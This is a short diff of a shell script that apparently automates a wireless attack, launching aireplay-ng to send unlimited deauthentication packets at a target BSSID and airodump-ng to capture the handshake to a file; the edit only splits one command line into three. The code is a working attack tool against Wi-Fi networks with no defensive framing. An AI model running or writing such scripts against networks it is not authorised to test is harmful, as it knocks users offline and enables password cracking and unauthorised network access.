@@ -57,7 +57,9 @@ mkdir -p "$output_dir"
 output_file="${output_dir}/${bssid}_${timestamp}"
 
 # Launch attacks in separate xterm windows
-xterm -e "aireplay-ng -0 0 -a $bssid $interface" & sleep 1 && xterm -e "airodump-ng --bssid $bssid -c $channel -w $output_file $interface"
+xterm -e "aireplay-ng -0 0 -a $bssid $interface" &
+sleep 1
+xterm -e "airodump-ng --bssid $bssid -c $channel -w $output_file $interface"
 
 # Wait for capture file to be generated
 pcap_file="${output_file}-01.cap"
